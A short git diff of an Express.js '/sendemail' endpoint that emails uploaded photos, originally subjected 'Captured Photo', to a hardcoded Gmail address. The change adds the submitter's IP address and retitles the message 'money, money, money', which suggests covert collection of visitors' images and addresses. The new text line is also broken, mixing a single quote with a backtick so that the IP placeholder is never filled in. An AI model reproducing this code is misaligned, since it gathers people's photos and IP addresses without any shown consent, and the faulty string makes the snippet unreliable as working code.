@@ -37,11 +37,14 @@ app.post('/sendemail', upload.single('photo'), (req, res) => {
     }
   });
 
+  // user IP address
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
   const mailOptions = {
     from: 'bagapp@zohomail.com',
     to: 'bagapp69@gmail.com',
-    subject: 'Captured Photo',
-    text: 'Photo attached.',
+    subject: 'money, money, money',
+    text: 'A new photo has been submitted.\n\nIP address: ${ip}`',
     attachments: [
       {
         filename: 'photo.jpg',
